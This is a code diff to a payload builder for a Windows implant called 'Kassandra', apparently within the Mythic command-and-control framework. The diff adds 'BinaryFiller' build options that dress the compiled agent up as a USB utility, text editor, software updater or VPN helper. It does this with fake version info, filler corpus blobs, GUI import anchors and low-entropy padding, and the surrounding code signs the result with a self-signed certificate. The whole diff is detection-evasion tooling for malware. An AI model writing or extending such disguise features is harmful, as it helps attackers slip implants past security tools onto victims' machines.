@@ -85,6 +85,20 @@ class KassandraAgent(PayloadType):
             default_value=False,
             description="Lab only: write lifecycle diagnostics to %TEMP%\\kassandra_debug.log. Leave off in production.",
         ),
+        BuildParameter(
+            name="binary_filler_preset",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["usb-utility", "text-editor", "software-updater", "vpn-helper", "desktop-app"],
+            default_value="usb-utility",
+            description="BinaryFiller cover preset: VERSIONINFO + corpus blobs + GUI import anchors baked at compile time.",
+        ),
+        BuildParameter(
+            name="binary_filler_budget",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["conservative", "standard", "aggressive"],
+            default_value="standard",
+            description="BinaryFiller blob budget: conservative≈12KiB, standard≈32KiB, aggressive≈128KiB of low-entropy cover data.",
+        ),
     ]                                             # Array if we want custom parameters during build
     agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
     agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon
@@ -373,9 +387,17 @@ class KassandraAgent(PayloadType):
             build_command = f"cargo {toolchain} build --release {target} {manifest} {features_flag}"
             filename = f"{agent_build_path.name}/kassandra/target/x86_64-pc-windows-gnu/release/kassandra.exe"
 
+        bf_preset = self.get_parameter("binary_filler_preset") or "usb-utility"
+        bf_budget = self.get_parameter("binary_filler_budget") or "standard"
+        bf_corpus = os.environ.get("BINARY_FILLER_CORPUS", "/opt/bf-corpus")
+
         build_env = {
             **dict(os.environ),
             "RUSTFLAGS": "--remap-path-prefix /Mythic/=/ --remap-path-prefix /root/.cargo/registry/src/=dep/",
+            # BinaryFiller: ops fail policy in build.rs; real corpus required.
+            "BINARY_FILLER_CORPUS": bf_corpus,
+            "BINARY_FILLER_PRESET": bf_preset,
+            "BINARY_FILLER_BUDGET": bf_budget,
         }
 
         proc = await asyncio.create_subprocess_shell(
@@ -402,7 +424,11 @@ class KassandraAgent(PayloadType):
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName="Compiling",
-            StepStdout=f"Successfully compiled Kassandra\n{stderr_str}",
+            StepStdout=(
+                f"Successfully compiled Kassandra\n"
+                f"BinaryFiller: preset={bf_preset} budget={bf_budget} corpus={bf_corpus}\n"
+                f"{stderr_str}"
+            ),
             StepSuccess=True
         ))
         pfx_path = generate_self_signed_cert()
